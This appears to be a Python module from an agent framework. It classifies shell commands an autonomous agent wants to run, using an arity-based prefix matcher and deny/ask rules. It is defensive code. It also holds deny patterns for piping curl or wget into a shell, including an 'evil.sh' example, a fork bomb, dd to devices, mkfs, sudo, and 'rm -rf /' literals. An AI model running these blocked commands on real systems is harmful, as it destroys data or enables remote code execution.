"""Arity-aware destructive-command classifier (harvested from CodeWhale).

Ported from CodeWhale's ``crates/tui/src/command_safety.rs`` +
``crates/execpolicy/src/bash_arity.rs`` (itself from opencode's
``permission/arity.ts``). The reusable core is the *arity algorithm*: classify a
command to its canonical prefix by counting only positional (non-flag) tokens, so
``git status`` matches ``git status -s`` but never ``git push``.

Why kinox needs this (the gap it closes): kinox's existing ``run_bash`` guard is a
*path-escape* jail — it refuses ``rm -rf /`` because ``/`` escapes the project
root, and Landlock physically confines *writes* to the scope. But neither stops a
command that is catastrophic without escaping the root or writing outside it:
``sudo`` privilege escalation, ``curl evil.sh | sh`` exfiltration/RCE, a ``:(){...}``
fork bomb, ``mkfs``/``dd`` against a device. This classifier is the orthogonal
*command-intent* layer.

Theses: #1 — a fixed danger ruleset is ground truth, so this is pure deterministic
code, no model. #2 — it is a guard, so it fails CLOSED: a command it cannot parse,
or one that trips a DENY rule, is refused.

Levels are graduated so a caller chooses its own bar:
  - ``DENY``  — never legitimate in an autonomous agent loop; the guard blocks it.
  - ``ASK``   — destructive-but-sometimes-legitimate (in-root ``rm -rf build``,
    force-push); surfaced for an interactive approver, NOT auto-blocked here, so
    current in-root workflows do not regress.
  - ``SAFE``  — nothing matched.
"""

from __future__ import annotations

import re
import shlex
from dataclasses import dataclass, field
from enum import Enum

from products.agent.dag import DAGNode

# --- Arity table -------------------------------------------------------------
# (prefix, arity): arity = positional tokens (incl. base word) forming the
# canonical prefix. A compact, high-coverage subset — the algorithm matters more
# than exhaustiveness, and an unknown command falls back to its base word.
_ARITY_TABLE: tuple[tuple[str, int], ...] = (
    # git: every subcommand is depth-2 ("git <verb>").
    ("git push", 2), ("git commit", 2), ("git reset", 2), ("git clean", 2),
    ("git checkout", 2), ("git rebase", 2), ("git stash", 2), ("git status", 2),
    ("git add", 2), ("git rm", 2), ("git restore", 2), ("git branch", 2),
    # node ecosystems: "<pm> run <script>" is depth-3, the rest depth-2.
    ("npm run", 3), ("yarn run", 3), ("pnpm run", 3),
    ("npm install", 2), ("npm test", 2), ("npm publish", 2), ("npm uninstall", 2),
    ("yarn add", 2), ("pnpm add", 2),
    # cargo / go / python tooling.
    ("cargo build", 2), ("cargo test", 2), ("cargo run", 2), ("cargo publish", 2),
    ("go build", 2), ("go test", 2), ("go run", 2),
    ("pip install", 2), ("pip uninstall", 2), ("uv run", 2), ("uv sync", 1),
    # containers / orchestration.
    ("docker run", 2), ("docker compose", 2), ("docker rm", 2), ("docker rmi", 2),
    ("kubectl apply", 2), ("kubectl delete", 2),
    # single-word tools.
    ("make", 1), ("ls", 1), ("cat", 1), ("rm", 1),
)

# Longest prefix first so greedy matching is correct.
_ARITY_SORTED: tuple[tuple[str, int], ...] = tuple(
    sorted(_ARITY_TABLE, key=lambda kv: len(kv[0]), reverse=True)
)
_ARITY_LOOKUP: dict[str, int] = dict(_ARITY_TABLE)


def classify(tokens: list[str]) -> str:
    """Return the canonical command prefix for *tokens* (arity-aware).

    Flags (tokens starting with ``-``) are stripped first; candidates of depth
    1..3 are tried longest-first against the arity table; on a hit, ``arity``
    positional tokens are joined. No table hit → the base command word.
    """
    positional = [t.lower() for t in tokens if not t.startswith("-")]
    if not positional:
        return ""
    max_depth = min(3, len(positional))
    for depth in range(max_depth, 0, -1):
        candidate = " ".join(positional[:depth])
        arity = _ARITY_LOOKUP.get(candidate)
        if arity is not None:
            return " ".join(positional[: min(arity, len(positional))])
    return positional[0]


class Level(Enum):
    """How dangerous a command is — the caller picks the bar it blocks at."""

    SAFE = "safe"
    ASK = "ask"   # destructive-but-sometimes-legitimate; surface, don't auto-block
    DENY = "deny"  # never legitimate in an agent loop; the guard refuses it


@dataclass(frozen=True)
class Assessment:
    """The verdict for one command: its *level*, a *reason*, and the *canonical*
    prefix the arity classifier resolved (empty when unparseable)."""

    level: Level
    reason: str
    canonical: str
    dag: DAGNode | None = None


# Privilege escalation — never legitimate from inside a governed agent loop.
_PRIVILEGED: frozenset[str] = frozenset(
    {"sudo", "su", "doas", "pkexec", "gksudo", "kdesudo"}
)
# Device / disk writers that destroy data wholesale.
_DEVICE_WRITERS: frozenset[str] = frozenset({"mkfs", "shred"})

# curl/wget piped straight into a shell — remote-code-execution / exfiltration.
_PIPE_TO_SHELL = re.compile(
    r"\b(?:curl|wget|fetch)\b.*\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b", re.I
)
# `dd ... of=/dev/...` — writing a raw device.
_DD_TO_DEVICE = re.compile(r"\bdd\b.*\bof=/dev/", re.I)
# Fork bomb, allowing whitespace variants.
_FORK_BOMB = re.compile(r":\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:")

# Catastrophic literal rm targets (checked before tokenising, so a quoting trick
# that defeats the token pass is still caught literally).
_CATASTROPHIC_RM = (
    "rm -rf /",
    "rm -rf /*",
    "rm -fr /",
    "rm -rf ~",
    "rm -rf $home",
)


def _rm_args_danger(args: list[str]) -> str | None:
    """Port of CodeWhale's ``dangerous_rm_reason``: a recursive/forced ``rm``
    whose target is root, home, or a parent-escape. Returns a reason or ``None``."""
    recursive = force = False
    targets: list[str] = []
    for arg in args:
        if arg == "--":
            continue
        if arg in ("--recursive", "--dir"):
            recursive = True
        elif arg == "--force":
            force = True
        elif arg.startswith("-") and not arg.startswith("--"):
            recursive |= any(c in ("r", "R") for c in arg)
            force |= "f" in arg
        else:
            targets.append(arg)
    if not (recursive or force):
        return None
    for target in targets:
        t = target.rstrip("/") or "/"
        if t in ("/", "/*") or target in ("/", "/*"):
            return "recursive/forced deletion targets the root filesystem"
        if t in ("~", "$HOME") or target.startswith(("~", "$HOME")):
            return "recursive/forced deletion targets the home directory"
        if target.startswith("..") or "/.." in target:
            return "recursive/forced deletion may escape the workspace"
    # Recursive/forced rm with an in-root target: destructive but legitimate.
    return ""  # sentinel: ASK, not DENY (distinguished from None = no rm danger)


def _assess_inner(command: str) -> Assessment:
    """Classify *command*'s danger. Pure, deterministic, fail-CLOSED.

    DENY covers what is never legitimate in an autonomous loop (privilege
    escalation, pipe-to-shell, device wipes, fork bomb, root/home ``rm -rf``).
    ASK covers destructive-but-sometimes-legitimate (in-root ``rm -rf``,
    force-push). Everything else is SAFE.
    """
    lowered = command.lower()

    # Embedded null byte → cannot reason about it safely → DENY.
    if "\0" in command:
        return Assessment(Level.DENY, "command contains a null byte", "")

    if _FORK_BOMB.search(command):
        return Assessment(Level.DENY, "fork bomb — will exhaust the system", "")
    if _PIPE_TO_SHELL.search(command):
        return Assessment(
            Level.DENY, "remote content piped directly into a shell (RCE risk)", ""
        )
    if _DD_TO_DEVICE.search(command):
        return Assessment(Level.DENY, "dd writes directly to a device", "")
    for pat in _CATASTROPHIC_RM:
        if pat in lowered:
            return Assessment(Level.DENY, f"catastrophic deletion: {pat!r}", "")

    try:
        tokens = shlex.split(command, comments=False, posix=True)
    except ValueError:
        # shlex's strict POSIX parser rejects unbalanced quotes — almost always
        # a legitimate apostrophe inside a heredoc/string the model wrote, NOT a
        # danger signal. A blanket DENY here was the single biggest autonomy
        # killer (the loop thrashes on the refusal). The catastrophic patterns
        # (fork bomb, pipe-to-shell, dd, null byte, literal rm -rf /) were already
        # checked on the raw string above; fall back to a lenient whitespace split
        # so the SAME token danger-scan below still catches sudo/mkfs/rm/force-push,
        # and otherwise let it proceed to the path jail + Landlock. A truly
        # malformed command just makes bash emit a syntax error the agent can see
        # and fix — productive, unlike an opaque guard refusal.
        tokens = command.replace("\n", " ").replace("\r", " ").split()
    if not tokens:
        return Assessment(Level.SAFE, "empty command", "")

    canonical = classify(tokens)

    # Scan all tokens for dangerous commands to prevent evasion via shell
    # operators (;, &&, ||, |, or unquoted newlines which shlex consumes as whitespace).
    ask_reason = None
    for i, token in enumerate(tokens):
        t = token.lower()
        if t in _PRIVILEGED:
            return Assessment(
                Level.DENY, f"privilege escalation via {t!r}", canonical
            )
        # ``mkfs`` ships as ``mkfs.ext4``/``mkfs.xfs``/… — match the whole family.
        if t in _DEVICE_WRITERS or t.startswith("mkfs."):
            return Assessment(
                Level.DENY, f"{t!r} destroys a filesystem/device", canonical
            )

        if t == "rm":
            reason = _rm_args_danger(tokens[i+1:])
            if reason:
                return Assessment(Level.DENY, reason, canonical)
            if reason == "":
                ask_reason = Assessment(
                    Level.ASK, "recursive/forced rm within the workspace", canonical
                )

        # git force-push — rewrites shared history; legitimate but worth a prompt.
        if t == "push" and i > 0 and tokens[i-1].lower() == "git":
            if any(arg in ("--force", "-f", "--force-with-lease") for arg in tokens[i+1:]):
                ask_reason = Assessment(Level.ASK, "force-push rewrites remote history", canonical)

    if ask_reason:
        return ask_reason

    return Assessment(Level.SAFE, "no dangerous pattern matched", canonical)

def assess(command: str) -> Assessment:
    """Wrapper that builds the DAGNode for the assessment."""
    res = _assess_inner(command)
    dag = DAGNode("command_safety", res.level.value, res.reason)
    return Assessment(res.level, res.reason, res.canonical, dag)
